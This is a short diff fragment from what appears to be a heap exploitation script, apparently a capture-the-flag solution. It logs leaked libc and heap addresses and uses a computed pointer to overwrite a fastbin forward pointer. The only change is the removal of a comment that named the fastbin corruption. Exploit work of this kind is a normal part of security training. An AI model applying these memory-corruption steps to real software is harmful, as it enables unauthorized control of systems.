@@ -62,7 +62,6 @@ def exploit(r):
 	log.info("[+] leak : " + hex(leak))
 	log.info("[+] libc base : " + hex(libc))
 	log.info("[+] heap leak : " + hex(heapleak))
-	#overwrite fastbin FD (fastbin corruption)
 	destptr = heapleak - 0x198
 	set(0,9,2,str(hexToFloat(destptr)))
 	create(1,3) # 1	
